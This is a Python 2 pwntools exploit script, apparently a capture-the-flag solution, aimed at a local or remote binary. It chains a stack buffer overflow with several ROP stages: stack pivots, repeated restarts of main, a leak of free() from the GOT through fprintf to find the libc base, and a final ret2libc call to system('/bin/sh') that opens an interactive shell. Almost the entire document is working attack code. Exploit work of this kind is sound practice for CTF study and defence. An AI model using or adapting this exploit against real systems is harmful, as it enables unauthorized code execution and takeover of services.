#!/usr/bin/env python2
from pwn import *
import sys

HOST = ''
PORT = 40010

LIBC    = 0x097950  # offset from free() to the libc base
BINSH   = 0x1b3e9a  # offset from base to "/bin/sh"
SYSTEM  = 0x04f440  # offset from base to system()

FPRINTF = 0x400830  # fprintf jump
RESTART = 0x400b2a  # main addr (but after the saving of rbp)
POPRSP  = 0x400d7d  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
POPRDI  = 0x400d83  # pop rdi ; ret
POPRSI  = 0x400d81  # pop rsi ; pop r15 ; ret
POPRBP  = 0x400918  # pop rbp ; ret
RET     = 0x4007be  # ret

DEBUG = False
LOCAL = True
if len(sys.argv) > 1:
    LOCAL = False
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if LOCAL:
    io = process('./../chall')
else:
    io = remote(HOST, PORT)

if LOCAL and DEBUG:
    gdb.attach(io.pid, 'b *0x400d09')

# step 1: first ROP chain is extremely limited, so we setup enough to restart the bin
#         with a partial pivot (rbp) and then we will be able to do a larger ROP later
#         after the full pivot.

rop  = p64(0x602698)  # rbp
rop += p64(RESTART)   # restart binary

print io.recvuntil(': ')[:-7].strip()
io.sendline('A'*1024+'\x10'+rop)

# step 2: we restart again and write a partial ropchain within which we will have
#         the stdout FILE * written, then we setup another restart and full pivot

# this is what will happen at the end of the run
rop  = p64(0x602748)  # rbp
rop += p64(RESTART)   # restart binary

# this is the first part of the rop chain being built to life the FILE *
bnc  = cyclic(160)
bnc += p64(POPRDI)    # pop rdi ; ret
bnc += cyclic(1024-len(bnc))

pay  = p64(POPRSP)    # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pay += p64(0x602310)

io.recvuntil(': ')
io.sendline(bnc+'\x10'+rop+cyclic(168)+pay)

# step 3: we restart again, writing the second part of the ropchain within which
#         that elusive stout FILE * has been written. The second part of the rop
#         chain gets us a leak and restarts (for a fflush and yet another overflow)

bnc  = p64(POPRSI)     # pop rsi ; pop r15 ; ret
bnc += p64(0x601f80)   # free@GOT
bnc += p64(0x000000)
bnc += p64(RET) * 112  # make enough space to run fwrite (quite deep stack chain)
bnc += p64(FPRINTF)    # fprintf()
bnc += p64(RET)        # ret
bnc += p64(POPRBP)     # pop rbp ; ret
bnc += p64(0x602988)
bnc += p64(POPRDI)     # pop rdi ; ret
bnc += p64(0x000001)   # fake argc
bnc += p64(RESTART)    # main addr
bnc += cyclic(1024-len(bnc), alphabet=string.ascii_uppercase)

io.recvuntil(': ')
io.sendline(bnc)
io.recvline()

leak = io.recvn(6).ljust(8, '\x00')
leak = u64(leak)
libc = leak - LIBC

log.info('leak: 0x%012x' % leak)
log.info('libc: 0x%012x' % libc)

# step 4: final payload
pay  = p64(0x000000)       # rbp
pay += p64(POPRDI)         # pop rdi ; ret
pay += p64(libc + BINSH)   # /bin/sh
pay += p64(libc + SYSTEM)  # system()

io.recvuntil(': ')
io.sendline('\x00' * 1024 + '\x10' + pay)
io.recvline()

# step 5: collect shell
io.sendline('id')
log.success('shell: %s' % io.recvline().strip())
io.interactive()
sys.exit(0)

io.interactive()
